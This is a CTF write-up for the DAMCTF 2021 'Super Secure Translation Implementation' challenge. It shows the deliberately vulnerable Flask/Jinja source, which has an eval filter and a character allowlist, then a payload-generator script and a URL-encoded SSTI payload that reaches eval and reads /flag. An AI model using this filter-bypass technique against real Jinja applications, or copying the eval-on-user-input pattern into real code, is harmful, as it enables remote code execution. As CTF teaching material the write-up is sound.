# DAMCTF2021 - Web - Super Secure Translation Implementation


# Introduction
This challenge was a simple Jinja SSTI challenge with some filter bypassing involved.



# Files
I don't really remember what was provided in the challenge but after some manual enumerations(Entries from the docker file) and content discovery, following files could be found with the help of the following code block in the app.py.

```python
@server.route("/")
@server.route("/<path>")
def index(path=""):
    # Show app.py source code on homepage, even if not requested.
    if path == "":
        path = "app.py"

    # Make this request hackproof, ensuring that only app.py is displayed.
    elif not os.path.exists(path) or "/" in path or ".." in path:
        path = "app.py"

    # User requested app.py, show that.
    with open(path, "r") as f:
        return render_template("index.html", code=f.read())
```

![](https://i.imgur.com/Zk5IUNg.png)


Found files,

![](https://i.imgur.com/hjR618e.png)


There are 4 files that we should care which are `app.py`, `check.py`, `filters.py` and `limit.py`

`app.py`,
```python
from flask import Flask, render_template, render_template_string, Response, request
import os

from check import detect_remove_hacks
from filters import *

server = Flask(__name__)

# Add filters to the jinja environment to add string
# manipulation capabilities
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e


@server.route("/")
@server.route("/<path>")
def index(path=""):
    # Show app.py source code on homepage, even if not requested.
    if path == "":
        path = "app.py"

    # Make this request hackproof, ensuring that only app.py is displayed.
    elif not os.path.exists(path) or "/" in path or ".." in path:
        path = "app.py"

    # User requested app.py, show that.
    with open(path, "r") as f:
        return render_template("index.html", code=f.read())


@server.route("/secure_translate/", methods=["GET", "POST"])
def render_secure_translate():
    payload = request.args.get("payload", "secure_translate.html")
    print(f"Payload Parsed: {payload}")
    resp = render_template_string(
        """{% extends "secure_translate.html" %}{% block content %}<p>"""
        + str(detect_remove_hacks(payload))
        + """</p><a href="/">Take Me Home</a>{% endblock %}"""
    )
    return Response(response=resp, status=200)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 30069))
    server.run(host="0.0.0.0", port=port, debug=False)

```

`filters.py`,

```python
import base64


def uppercase(x):
    return x.upper()


def lowercase(x):
    return x.lower()


def b64d(x):
    return base64.b64decode(x)


def order(x):
    return ord(x)


def character(x):
    return chr(x)


def e(x):
    # Security analysts reviewed this and said eval is unsafe (haters).
    # They would not approve this as "hack proof" unless I add some
    # checks to prevent easy exploits.

    print(f"Evaluating: {x}")

    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]

    for y in forbidlist:
        if y in x:
            return "Eval Failed: Foridlist."

    if x[0:4] == "open" or x[0:4] == "eval":
        return "Not That Easy ;)"

    try:
        return eval(x)
    except Exception as exc:
        return f"Eval Failed: {exc}"
```

`limit.py`,

```python
import time

from rctf import golf


def get_golf_limit() -> int:
    rctf_host = "https://damctf.xyz/"
    challenge_id = "super-secure-translation-implementation"
    ctf_start = 1636156800
    limit_function = lambda x: (x * 2) + 147

    limit = golf.calculate_limit(rctf_host, challenge_id, ctf_start, limit_function)
    return limit


def is_within_bounds(payload: str) -> bool:

    return len(payload) <= get_golf_limit()
```

`check.py`,
```python
from limit import is_within_bounds, get_golf_limit


def allowlist_check(payload, allowlist):
    # Check against allowlist.
    print(f"Starting Allowlist Check with {payload} and {allowlist}")
    if set(payload) == set(allowlist) or set(payload) <= set(allowlist):
        return payload
    print(f"Failed Allowlist Check: {set(payload)} != {set(allowlist)}")
    return "Failed Allowlist Check, payload-allowlist=" + str(
        set(payload) - set(allowlist)
    )


def detect_remove_hacks(payload):
    # This effectively destroyes all web attack vectors.
    print(f"Received Payload with length:{len(payload)}")

    if not is_within_bounds(payload):
        return f"Payload is too long for current length limit of {get_golf_limit()} at {len(payload)} characters. Try locally."

    allowlist = [
        "c",
        "{",
        "}",
        "d",
        "6",
        "l",
        "(",
        "b",
        "o",
        "r",
        ")",
        '"',
        "1",
        "4",
        "+",
        "h",
        "u",
        "-",
        "*",
        "e",
        "|",
        "'",
    ]
    payload = allowlist_check(payload, allowlist)
    print(f"Allowlist Checked Payload -> {payload}")

    return payload
```


Additionally `__init__.py` file(not really that important tho),

```python
from . import app
from . import check
from . import filters
from . import limit
```


# Important points in the files

There are some filter definitions in app.py,
```python
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e

```

Those filters are in filter.py. Important ones here are `ch` and `e`. Where `ch` charifies a given integer and `e` evaluates the given thing. 


Given payloads can only pass the check if the characters they are madeup with are in the following list. 
```python
    allowlist = [
        "c",
        "{",
        "}",
        "d",
        "6",
        "l",
        "(",
        "b",
        "o",
        "r",
        ")",
        '"',
        "1",
        "4",
        "+",
        "h",
        "u",
        "-",
        "*",
        "e",
        "|",
        "'",
    ]

```

At endpoint `/secure_translate/` GET parameter `payload` gets put into a template which is rendered later on meaning that we can inject our own malicious templates and get code execution. 
```python
@server.route("/secure_translate/", methods=["GET", "POST"])
def render_secure_translate():
    payload = request.args.get("payload", "secure_translate.html")
    print(f"Payload Parsed: {payload}")
    resp = render_template_string(
        """{% extends "secure_translate.html" %}{% block content %}<p>"""
        + str(detect_remove_hacks(payload))
        + """</p><a href="/">Take Me Home</a>{% endblock %}"""
    )
    return Response(response=resp, status=200)
```

There is a length check on the payload. It should not pass the character limit of 161.

```python
    if not is_within_bounds(payload):
        return f"Payload is too long for current length limit of {get_golf_limit()} at {len(payload)} characters. Try locally."
```
```python
def is_within_bounds(payload: str) -> bool:

    return len(payload) <= get_golf_limit()
```

To sump it all, there is a template injection but there is a filter on it. There are useful custom made filters on the app which we can use to bypass the check and it should be less than 161. Easy enough.




# Jinja filters

Custom made filters are explained like below in the original flask documentation.

https://flask.palletsprojects.com/en/2.0.x/templating/#registering-filters
![](https://i.imgur.com/6sxrNXg.png)


So with a `|` we can call the defined filters, nice.


# Exploit

We can verify that our template gets rendered.

`{{1-1}}`

![](https://i.imgur.com/3JCUtnE.png)




With the template below we can bypass the filter and print k.
```
{{(111-4)|ch}}
```

![](https://i.imgur.com/dfzLD7I.png)


We can also chain filters,
```
{{((111-1)|ch+(111-4)|ch)|e}}
```

Don't forget to url encode the payload,

![](https://i.imgur.com/MxqHEIa.png)

Nice ! We reached to `eval()`.

So we can automate this and write a script to automatically bypass the filter and generate payloads.


I know, spagetti code.
```python
def chrify(x):
    return f"({x})|ch"

allowlist = [
        "c",
        "{",
        "}",
        "d",
        "6",
        "l",
        "(",
        "b",
        "o",
        "r",
        ")",
        '"',
        "1",
        "4",
        "+",
        "h",
        "u",
        "-",
        "*",
        "e",
        "|",
        "'",
    ]

formulas = {
    "0": "66-14-4",
    "1": "66-14-1-1-1",
    "2": "66-16",
    "3": "66-14-1",
    "4": "66-14",
    "5": "66-11-1-1",
    "6": "66-11-1",
    "7": "66-11",
    "8": "66-4-4-1-1",
    "9": "66-6-1-1-1",
    "a": "111-14",
    "b": "111-11-1-1",
    "c": "111-11-1",
    "d": "111-11",
    "e": "111-11+1",
    "f": "116-14",
    "g": "114-11",
    "h": "111-6-1",
    "i": "111-6",
    "j": "111-4-1-1-1",
    "k": "111-4",
    "l": "114-6",
    "m": "111-1-1",
    "n": "111-1",
    "o": "111",
    "p": "111+1",
    "q": "114-1",
    "r": "114",
    "s": "116-1",
    "t": "116",
    "u": "141-1-16-4-1-1-1",
    "v": "141-1-16-4-1-1",
    "w": "141-1-16-4-1",
    "x": "141-1-16-4",
    "y": "141-1-16-1-1-1",
    "z": "141-1-16-1-1",
    ".": "46",
    "_": "111-14-1-1",
    "\"":"41-6-1",
    "(":"41-1",
    ")":"41",
    "/":"61-14",
    ",":"44"
}

"""
for i,j in formulas.items():
    print(i,chr(eval(j)))
"""
pld = """"1"+open('/flag').read()"""

str = ""
for char in pld:
    if char in allowlist:
        str+=char + "+"
    else:
        str+=chrify(formulas[char]) + "+"
        

str = str.replace('+', '%2b')

print(f"({str[:-1]})|e")


```

```python
morph3 ➜ damctf-ssti-challenge/ λ python3 solver.py
("%2b1%2b"%2b%2b%2bo%2b(111%2b1)|ch%2be%2b(111-1)|ch%2b(%2b'%2b(61-14)|ch%2b(116-14)|ch%2bl%2b(111-14)|ch%2b(114-11)|ch%2b'%2b)%2b(46)|ch%2br%2be%2b(111-14)|ch%2bd%2b(%2b)%2)|e
```



There is also a character limit as well. Lovely.
![](https://i.imgur.com/gNtOnlP.png)

Looking into it, some of the allowed characters are not concatenated well. Let's fix it.
```python
('"1"+o'+(111+1)|ch+'e'+(111-1)|ch+"('"+(61-14)|ch+(116-14)|ch+"l"+(111-14)|ch+(114-11)|ch+"')"+(46)|ch+"re"+(111-14)|ch+"d()")|e
```

https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload={{%28%27%221%22%2Bo%27%2B%28111%2B1%29%7Cch%2B%27e%27%2B%28111%2D1%29%7Cch%2B%22%28%27%22%2B%2861%2D14%29%7Cch%2B%28116%2D14%29%7Cch%2B%22l%22%2B%28111%2D14%29%7Cch%2B%28114%2D11%29%7Cch%2B%22%27%29%22%2B%2846%29%7Cch%2B%22re%22%2B%28111%2D14%29%7Cch%2B%22d%28%29%22%29%7Ce}}

![](https://i.imgur.com/stGfYqJ.png)

Executed payload,

```python
"1"+open('/flag').read()
```

`dam{p4infu1_all0wl1st_w3ll_don3}`
